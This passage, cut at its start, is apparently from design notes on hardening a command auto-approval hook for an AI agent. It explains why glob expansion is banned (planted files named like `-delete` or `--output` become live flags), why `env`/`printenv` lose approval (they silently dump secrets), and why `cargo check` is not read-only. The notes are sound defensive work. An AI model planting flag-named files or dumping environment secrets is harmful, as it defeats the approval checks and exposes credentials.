  write-capable or exec-capable flag the draft admitted (`go env -w`, `ruff --fix-only`,
  `npx --plugin=`, `file -C`).
- Chose to ban `*` in gated-tool args rather than accept glob expansion there: a checked-in
  file named `-delete`/`--fix`/`--output` becomes a live flag on expansion. Stage D tools keep
  `*` because their admission criterion (no write-capable flag exists) makes a planted flag
  harmless.
- Chose to drop `env` and `printenv` from the approved set: both dump every environment
  variable, secrets included, with zero user visibility, and a security-hardening pass is the
  wrong place to keep silent secret reads for marginal convenience. Reversible in a follow-up
  if the prompts annoy (see `Not covered`).
- Chose to drop `cargo check` (writes `target/` and executes `build.rs` build scripts, so it
  was never read-only) and `python --version` (this stack uses `python3`; narrowing rather than
  keeping a second interpreter entry nobody invokes). Both were approved by the old regexes;
  the drop is recorded so the extra prompts are explainable.
- Chose to leave `sed`/`sort` off the allowlist entirely (proven by a must-not-approve test and
  the AC5 source grep) rather than add flag-gated entries for them, since neither has ever been
  part of the hook's approved surface; adding new approved tools is out of scope for a
  hardening fix.
- Chose exact, zero-argument matches for `pwd` and the `--version` trio (`node`, `python3`,
  `cargo`) over allowing trailing flags, carrying forward the current hook's existing `^pwd$`
  exactness rather than loosening it while rewriting everything around it.
- Chose to keep the safe-flag lists for `git log`/`diff`/`show` deliberately short (covering the
  pre-existing must-still-approve baseline plus a handful of obviously-safe additions like `-n`)
  rather than exhaustive, and named the gap explicitly in `Not covered`: the cost of an
  unlisted-but-safe flag is one extra prompt, not a security hole, so there is no pressure to
  front-load every git flag.
